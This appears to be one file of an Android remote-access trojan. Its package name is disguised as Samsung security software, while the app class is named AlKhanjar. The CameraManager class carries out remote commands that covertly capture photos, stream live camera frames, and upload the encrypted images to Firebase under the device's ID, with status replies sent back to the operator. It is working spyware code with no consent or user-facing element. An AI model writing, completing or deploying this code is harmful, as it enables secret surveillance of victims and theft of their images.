package com.samsung.android.security.v8.managers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.samsung.android.security.v8.AlKhanjarApp;
import com.samsung.android.security.v8.utils.CryptoManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * CameraManager - إدارة الكاميرا
 */
public class CameraManager {
    
    private static final String TAG = "CameraManager";
    private Context context;
    private android.hardware.camera2.CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private boolean isStreaming = false;
    
    public CameraManager(Context context) {
        this.context = context;
        this.cameraManager = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
    }
    
    /**
     * التقاط صورة
     */
    public void takePhoto(String cameraType, String commandId) {
        try {
            String cameraId = getCameraId(cameraType);
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
                sendResponse(commandId, "error", "Camera permission denied");
                return;
            }
            
            startBackgroundThread();
            
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    captureImage(commandId);
                }
                
                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }
                
                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    sendResponse(commandId, "error", "Camera error: " + error);
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Take photo error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * التقاط الصورة الفعلي
     */
    private void captureImage(String commandId) {
        try {
            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    processImage(image, commandId);
                    image.close();
                }
            }, backgroundHandler);
            
            Surface surface = imageReader.getSurface();
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(surface);
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
            
            cameraDevice.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession session) {
                    try {
                        session.capture(captureBuilder.build(), null, backgroundHandler);
                    } catch (Exception e) {
                        Log.e(TAG, "Capture error: " + e.getMessage());
                    }
                }
                
                @Override
                public void onConfigureFailed(CameraCaptureSession session) {
                    sendResponse(commandId, "error", "Camera configuration failed");
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Capture image error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * معالجة الصورة
     */
    private void processImage(Image image, String commandId) {
        try {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            
            Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
            
            // ضغط الصورة
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
            byte[] compressedBytes = baos.toByteArray();
            
            // رفع الصورة
            uploadImage(compressedBytes, commandId);
            
            // إغلاق الكاميرا
            closeCameraDevice();
            
        } catch (Exception e) {
            Log.e(TAG, "Process image error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * رفع الصورة إلى Firebase Storage
     */
    private void uploadImage(byte[] imageData, String commandId) {
        try {
            // تشفير الصورة
            byte[] encryptedData = CryptoManager.encryptBytes(imageData);
            
            FirebaseStorage storage = FirebaseStorage.getInstance();
            String fileName = "photos/" + AlKhanjarApp.getDeviceUniqueId() + "/" + System.currentTimeMillis() + ".jpg";
            StorageReference storageRef = storage.getReference().child(fileName);
            
            storageRef.putBytes(encryptedData)
                .addOnSuccessListener(taskSnapshot -> {
                    storageRef.getDownloadUrl().addOnSuccessListener(uri -> {
                        Map<String, Object> photoData = new HashMap<>();
                        photoData.put("url", uri.toString());
                        photoData.put("timestamp", System.currentTimeMillis());
                        photoData.put("encrypted", true);
                        
                        sendResponse(commandId, "success", photoData);
                        Log.d(TAG, "Photo uploaded successfully");
                    });
                })
                .addOnFailureListener(e -> {
                    Log.e(TAG, "Upload error: " + e.getMessage());
                    sendResponse(commandId, "error", e.getMessage());
                });
                
        } catch (Exception e) {
            Log.e(TAG, "Upload image error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * بدء البث المباشر
     */
    public void startLiveStream(String cameraType, String commandId) {
        if (isStreaming) {
            sendResponse(commandId, "error", "Already streaming");
            return;
        }
        
        try {
            String cameraId = getCameraId(cameraType);
            
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
                sendResponse(commandId, "error", "Camera permission denied");
                return;
            }
            
            startBackgroundThread();
            
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    startStreaming(commandId);
                }
                
                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }
                
                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    sendResponse(commandId, "error", "Camera error: " + error);
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Start stream error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * البث الفعلي
     */
    private void startStreaming(String commandId) {
        try {
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null && isStreaming) {
                    streamFrame(image);
                    image.close();
                }
            }, backgroundHandler);
            
            Surface surface = imageReader.getSurface();
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            captureBuilder.addTarget(surface);
            
            cameraDevice.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession session) {
                    captureSession = session;
                    try {
                        session.setRepeatingRequest(captureBuilder.build(), null, backgroundHandler);
                        isStreaming = true;
                        sendResponse(commandId, "success", "Streaming started");
                        Log.d(TAG, "Live streaming started");
                    } catch (Exception e) {
                        Log.e(TAG, "Streaming error: " + e.getMessage());
                    }
                }
                
                @Override
                public void onConfigureFailed(CameraCaptureSession session) {
                    sendResponse(commandId, "error", "Streaming configuration failed");
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Start streaming error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    /**
     * بث إطار واحد
     */
    private void streamFrame(Image image) {
        try {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            
            // ضغط أكثر للبث المباشر
            Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
            byte[] compressedBytes = baos.toByteArray();
            
            // إرسال الإطار إلى Firebase
            String base64Frame = android.util.Base64.encodeToString(compressedBytes, android.util.Base64.NO_WRAP);
            
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            database.getReference("stream")
                .child(AlKhanjarApp.getDeviceUniqueId())
                .setValue(base64Frame);
                
        } catch (Exception e) {
            Log.e(TAG, "Stream frame error: " + e.getMessage());
        }
    }
    
    /**
     * إيقاف البث
     */
    public void stopLiveStream(String commandId) {
        isStreaming = false;
        closeCameraDevice();
        sendResponse(commandId, "success", "Streaming stopped");
        Log.d(TAG, "Live streaming stopped");
    }
    
    /**
     * الحصول على معرف الكاميرا
     */
    private String getCameraId(String cameraType) throws CameraAccessException {
        String[] cameraIds = cameraManager.getCameraIdList();
        
        for (String id : cameraIds) {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            
            if (cameraType.equals("front") && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                return id;
            } else if (cameraType.equals("back") && facing == CameraCharacteristics.LENS_FACING_BACK) {
                return id;
            }
        }
        
        return cameraIds[0];
    }
    
    /**
     * بدء Thread الخلفية
     */
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    /**
     * إيقاف Thread الخلفية
     */
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Stop background thread error: " + e.getMessage());
            }
        }
    }
    
    /**
     * إغلاق الكاميرا
     */
    private void closeCameraDevice() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        stopBackgroundThread();
    }
    
    /**
     * إرسال استجابة
     */
    private void sendResponse(String commandId, String status, Object data) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference responseRef = database.getReference("responses")
                .child(AlKhanjarApp.getDeviceUniqueId())
                .child(commandId);
            
            Map<String, Object> response = new HashMap<>();
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            responseRef.setValue(response);
            
        } catch (Exception e) {
            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }
}
